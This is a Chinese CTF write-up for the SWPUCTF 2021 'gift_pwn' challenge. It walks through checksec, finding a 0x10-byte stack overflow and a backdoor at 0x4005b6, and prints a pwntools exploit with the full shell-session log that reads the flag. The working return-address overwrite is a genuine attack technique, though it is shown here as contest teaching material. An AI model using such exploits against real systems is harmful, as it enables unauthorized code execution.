# SWPUCTF 2021 新生赛 gift_pwn


# 思路

首先checksec：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230924104048603.png)

64位，只开启了NX。

反编译，发下入口就是溢出函数:

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230924104234756.png)

溢出距离0x10。同时发现后门函数：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230924104358462.png)

地址是：0x4005b6

# exp

```python
from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')
#r = process("./babystack") 
r = remote("node5.anna.nssctf.cn",28017)

offset = 0x10
backdoor = 0x4005b6
payload = b'a' * offset + b'a' * 8 + p64(backdoor)
r.sendline(payload)
r.interactive()
```

getshell

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python exp.py 
[+] Opening connection to node5.anna.nssctf.cn on port 28017: Done
[DEBUG] Sent 0x21 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  b6 05 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000020  0a                                                  │·│
    00000021
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x22 bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'pwn5\n'
bin
dev
flag
lib
lib32
lib64
pwn5
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'NSSCTF{ef171f2b-bb3e-4a2d-bdf8-9a8632048193}\n'
NSSCTF{ef171f2b-bb3e-4a2d-bdf8-9a8632048193}
$ 
[*] Interrupted
[*] Closed connection to node5.anna.nssctf.cn port 28017
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/gift-pwn/  

